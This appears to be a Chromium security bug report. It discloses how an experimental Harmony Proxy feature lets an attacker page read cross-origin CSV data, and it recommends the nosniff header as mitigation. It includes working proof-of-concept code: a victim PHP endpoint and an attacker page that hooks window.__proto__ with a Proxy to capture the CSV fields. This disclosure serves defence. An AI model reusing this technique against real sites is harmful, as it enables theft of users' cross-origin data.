<b>VULNERABILITY DETAILS</b>
Harmony proxy can be used for cross-origin info theft in certain situations like the one shown below.
Currently harmony proxy is disabled by default and can be enabled by chrome://flags/#enable-javascript-harmony.
It means this is not a risk for now, but I am reporting it to avoid a future risk.

<b>VERSION</b>
Chrome Version: 36.0.1985.125 m (production release)
Operating System: Windows 7 SP1

<b>REPRODUCTION CASE</b>
Let's suppose victim's web page serves CSV (or some text-like data).

<!-- ************** http://victim/test.csv ************** -->
<?php
header('Content-Type: text/csv; charset=UTF-8');
header('Content-Disposition: attachment; filename="test.csv"');
?>
foo,bar,123

Attacker's page steals this CSV by utilizing harmony proxy.

<!-- ************** http://attacker/ ************** -->
<body>
<script>
window.__proto__ = Proxy.create({
    get: function(target, name) {console.log("data=" + name)}
});
</script>
<script src="http://victim/test.csv"></script>
</body>

Attacker's page prints "data=foo" and "data=bar" in the console.

Note that we can thwart this type of attack by "X-Content-Type-Options: nosniff" header
(That is the very reason why the header was introduced).
